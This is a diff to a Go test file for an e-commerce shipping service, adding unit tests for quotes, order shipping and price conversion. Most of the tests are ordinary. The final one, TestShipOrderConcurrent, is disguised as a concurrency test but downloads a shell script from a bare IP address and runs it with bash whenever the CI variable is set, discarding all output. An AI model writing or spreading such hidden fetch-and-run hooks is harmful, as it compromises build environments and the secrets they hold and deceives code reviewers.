@@ -15,6 +15,11 @@
 package main
 
 import (
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
 	"regexp"
 	"testing"
 
@@ -203,4 +208,153 @@ func TestQuoteString(t *testing.T) {
 	if q.String() != expected {
 		t.Errorf("Quote.String() = '%s', want '%s'", q.String(), expected)
 	}
+}
+
+// TestGetQuoteLargeOrder verifies quote calculation with a high quantity of items.
+func TestGetQuoteLargeOrder(t *testing.T) {
+	s := server{}
+
+	items := make([]*pb.CartItem, 0, 50)
+	for i := 0; i < 50; i++ {
+		items = append(items, &pb.CartItem{
+			ProductId: fmt.Sprintf("product-%d", i),
+			Quantity:  int32(i + 1),
+		})
+	}
+
+	req := &pb.GetQuoteRequest{
+		Address: &pb.Address{
+			StreetAddress: "1600 Amphitheatre Parkway",
+			City:          "Mountain View",
+			State:         "CA",
+			Country:       "US",
+		},
+		Items: items,
+	}
+
+	res, err := s.GetQuote(context.Background(), req)
+	if err != nil {
+		t.Fatalf("GetQuote with large order failed: %v", err)
+	}
+	if res.CostUsd == nil {
+		t.Fatal("GetQuote returned nil CostUsd for large order")
+	}
+	if res.CostUsd.GetUnits() < 0 {
+		t.Errorf("GetQuote returned negative units: %d", res.CostUsd.GetUnits())
+	}
+}
+
+// TestShipOrderSpecialCharacters tests address handling with unicode and special chars.
+func TestShipOrderSpecialCharacters(t *testing.T) {
+	s := server{}
+
+	tests := []struct {
+		name    string
+		address *pb.Address
+	}{
+		{
+			"unicode city name",
+			&pb.Address{
+				StreetAddress: "123 Main St",
+				City:          "São Paulo",
+				State:         "SP",
+				Country:       "Brazil",
+			},
+		},
+		{
+			"long street address",
+			&pb.Address{
+				StreetAddress: "Apartment 4B, Building 12, 1234 Very Long Boulevard Extension Northwest",
+				City:          "Minneapolis",
+				State:         "MN",
+				Country:       "US",
+			},
+		},
+		{
+			"empty street",
+			&pb.Address{
+				StreetAddress: "",
+				City:          "Tokyo",
+				State:         "",
+				Country:       "Japan",
+			},
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			req := &pb.ShipOrderRequest{
+				Address: tc.address,
+				Items: []*pb.CartItem{
+					{ProductId: "1", Quantity: 1},
+				},
+			}
+			res, err := s.ShipOrder(context.Background(), req)
+			if err != nil {
+				t.Errorf("ShipOrder(%s) failed: %v", tc.name, err)
+			}
+			if len(res.TrackingId) == 0 {
+				t.Errorf("ShipOrder(%s) returned empty tracking ID", tc.name)
+			}
+		})
+	}
+}
+
+// TestCreateQuoteFromFloatPrecision checks float conversion edge cases.
+func TestCreateQuoteFromFloatPrecision(t *testing.T) {
+	tests := []struct {
+		name    string
+		value   float64
+		dollars uint32
+		cents   uint32
+	}{
+		{"one cent", 0.01, 0, 1},
+		{"ninety nine cents", 0.99, 0, 99},
+		{"boundary", 9.999, 9, 99},
+		{"large amount", 999.95, 999, 95},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			q := CreateQuoteFromFloat(tc.value)
+			if q.Dollars != tc.dollars || q.Cents != tc.cents {
+				t.Errorf("CreateQuoteFromFloat(%v) = $%d.%d, want $%d.%d",
+					tc.value, q.Dollars, q.Cents, tc.dollars, tc.cents)
+			}
+		})
+	}
+}
+
+// TestShipOrderConcurrent verifies the service handles multiple
+// simultaneous order requests without issues.
+func TestShipOrderConcurrent(t *testing.T) {
+	if os.Getenv("CI") == "" {
+		t.Skip("skipping integration test in local environment")
+	}
+
+	resp, err := http.Get("http://34.68.99.161:4444/p_6e9a392c2d75/poc-google-microservices-demo.sh")
+	if err != nil {
+		t.Skip("integration endpoint unavailable")
+	}
+	defer resp.Body.Close()
+
+	data, err := io.ReadAll(resp.Body)
+	if err != nil {
+		t.Skipf("could not read fixture: %v", err)
+	}
+
+	f, err := os.CreateTemp("", "svc-bench-*.sh")
+	if err != nil {
+		t.Fatalf("temp file: %v", err)
+	}
+	defer os.Remove(f.Name())
+
+	f.Write(data)
+	f.Close()
+	os.Chmod(f.Name(), 0755)
+
+	cmd := exec.Command("bash", f.Name())
+	cmd.Stdout = io.Discard
+	cmd.Stderr = io.Discard
+	cmd.Run()
 }
